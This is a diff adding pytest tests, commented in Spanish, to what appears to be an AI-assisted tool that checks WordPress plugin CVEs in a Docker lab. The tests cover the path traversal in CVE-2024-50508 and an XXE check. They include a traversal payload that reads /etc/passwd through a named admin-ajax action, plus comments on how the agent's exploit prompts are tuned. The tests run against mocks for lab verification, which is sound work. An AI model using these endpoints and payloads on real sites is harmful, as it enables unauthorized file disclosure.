@@ -6908,3 +6908,142 @@ def test_run_web_investigation_does_not_retry_when_guess_matches_given_source(mo
     _run_web_investigation(inv, lang="es", step=lambda m: None)
 
     assert calls == ["some-plugin-slug"]   # sin reintento, no habia nada que deducir
+
+
+def test_extract_followable_url_parses_copy_then_serve_json():
+    # bug real confirmado en vivo (CVE-2024-50508, Woocommerce Product Design): el endpoint
+    # vulnerable no refleja el contenido en la MISMA respuesta -- copia el fichero objetivo a una
+    # ruta publica nueva y devuelve {"url": "...", "path": "...", "status": "success"} en vez del
+    # contenido. Sin seguir esa URL, el secreto plantado nunca aparece aunque el traversal sea
+    # real.
+    from binoracle.workflows.wpverify import _extract_followable_url
+    text = ('{"path": "/var/www/html/wp-content/uploads/wcpc/images/uploaded_images/x.txt", '
+           '"message": "Image Uploaded Successfully", '
+           '"url": "http://lab.invalid/wp-content/uploads/wcpc/images/uploaded_images/x.txt", '
+           '"status": "success"}')
+    assert (_extract_followable_url(text) ==
+           "http://lab.invalid/wp-content/uploads/wcpc/images/uploaded_images/x.txt")
+
+
+def test_extract_followable_url_returns_none_for_non_json_or_no_url():
+    from binoracle.workflows.wpverify import _extract_followable_url
+    assert _extract_followable_url("not json") is None
+    assert _extract_followable_url('{"status": "ok"}') is None
+    assert _extract_followable_url('{"url": "not-a-url"}') is None
+    assert _extract_followable_url("") is None
+    assert _extract_followable_url(None) is None
+    assert _extract_followable_url("[1, 2, 3]") is None   # JSON valido, pero no un dict
+
+
+def test_verify_wordpress_path_traversal_follows_copy_then_serve_url(monkeypatch):
+    # end-to-end (con el laboratorio Docker mockeado): confirma que verify_wordpress_path_traversal
+    # de verdad SIGUE la URL que el endpoint devuelve cuando el secreto no esta en la respuesta
+    # directa, y lo encuentra ahi -- reproduciendo el bug real de CVE-2024-50508.
+    import json as _json
+    import secrets as _real_secrets
+    import binoracle.workflows.wpverify as wpverify
+
+    class _FakeResp:
+        def __init__(self, status_code, text):
+            self.status_code = status_code
+            self.text = text
+
+    class _FakeLab:
+        def write_canary(self, path, secret):
+            return True
+
+    class _FakeSession:
+        def __init__(self):
+            self.secret = None
+        def request(self, method, url, **kw):
+            if method == "GET" and url == "http://lab.invalid/leaked.txt":
+                return _FakeResp(200, self.secret)
+            return _FakeResp(200, _json.dumps({
+                "path": "/var/www/html/wp-content/uploads/leaked.txt",
+                "url": "http://lab.invalid/leaked.txt", "status": "success"}))
+
+    fake_sess = _FakeSession()
+    fake_boot = wpverify._LabSession(
+        lab=_FakeLab(), base_url="http://lab.invalid", admin_id="1", admin_user="a",
+        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=fake_sess, admin_sess=None,
+        shots=[], capture=lambda *a, **k: None)
+    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
+    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)
+
+    original_token_hex = _real_secrets.token_hex
+    def fake_token_hex(n):
+        s = original_token_hex(n)
+        if n == 16:
+            fake_sess.secret = s
+        return s
+    monkeypatch.setattr(wpverify.secrets, "token_hex", fake_token_hex)
+
+    res = wpverify.verify_wordpress_path_traversal(
+        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=pc_added_uploaded_image",
+        "POST", {"file[path]": "/etc/passwd"}, path_param_hint="file[path]")
+
+    assert res.verified is True
+    assert res.evidence.get("url_seguida") == "http://lab.invalid/leaked.txt"
+    assert fake_sess.secret in res.evidence.get("respuesta_cuerpo_recorte", "")
+
+
+def test_verify_wordpress_xxe_follows_copy_then_serve_url(monkeypatch):
+    # mismo patron "copia-y-sirve" aplicado a XXE: si la respuesta no trae el secreto directo
+    # pero es JSON con una 'url' que apunta a donde quedo copiado/servido el fichero, se sigue esa
+    # URL antes de rendirse.
+    import json as _json
+    import secrets as _real_secrets
+    import binoracle.workflows.wpverify as wpverify
+
+    class _FakeResp:
+        def __init__(self, status_code, text):
+            self.status_code = status_code
+            self.text = text
+
+    class _FakeLab:
+        def write_canary(self, path, secret):
+            return True
+
+    class _FakeSession:
+        def __init__(self):
+            self.secret = None
+        def request(self, method, url, **kw):
+            if method == "GET" and url == "http://lab.invalid/leaked-xxe.txt":
+                return _FakeResp(200, self.secret)
+            return _FakeResp(200, _json.dumps({"url": "http://lab.invalid/leaked-xxe.txt",
+                                               "status": "success"}))
+
+    fake_sess = _FakeSession()
+    fake_boot = wpverify._LabSession(
+        lab=_FakeLab(), base_url="http://lab.invalid", admin_id="1", admin_user="a",
+        admin_pass="b", sub_user="s", sub_pass="p", sub_sess=fake_sess, admin_sess=None,
+        shots=[], capture=lambda *a, **k: None)
+    monkeypatch.setattr(wpverify, "_bootstrap_lab", lambda *a, **kw: fake_boot)
+    monkeypatch.setattr(wpverify, "_check_prereqs", lambda *a, **k: None)
+
+    original_token_hex = _real_secrets.token_hex
+    def fake_token_hex(n):
+        s = original_token_hex(n)
+        if n == 16:
+            fake_sess.secret = s
+        return s
+    monkeypatch.setattr(wpverify.secrets, "token_hex", fake_token_hex)
+
+    res = wpverify.verify_wordpress_xxe(
+        "/tmp/fake", "some-plugin", "/wp-admin/admin-ajax.php?action=import_xml", "POST",
+        {"xml": ""}, xml_param_hint="xml")
+
+    assert res.verified is True
+    assert res.evidence.get("url_seguida") == "http://lab.invalid/leaked-xxe.txt"
+
+
+def test_research_and_poc_prompts_require_action_value_in_endpoint():
+    # bug real confirmado en vivo (CVE-2024-50508): 'action' salia listado como un nombre de
+    # parametro suelto sin su valor real, asi que admin-ajax.php nunca enrutaba la peticion a
+    # ningun manejador -- las 40 variantes de traversal probadas no podian funcionar por mucho
+    # que el payload fuera correcto. Los prompts que generan la hipotesis/extraen del PoC real
+    # deben exigir que 'action' vaya en la URL del endpoint, no como parametro sin valor.
+    from binoracle.workflows.cve_agent import _RESEARCH_SYS, _EXTRACT_POC_SYS
+    for prompt in (_RESEARCH_SYS, _EXTRACT_POC_SYS):
+        assert "action" in prompt
+        assert "NUNCA dejes 'action' como" in prompt
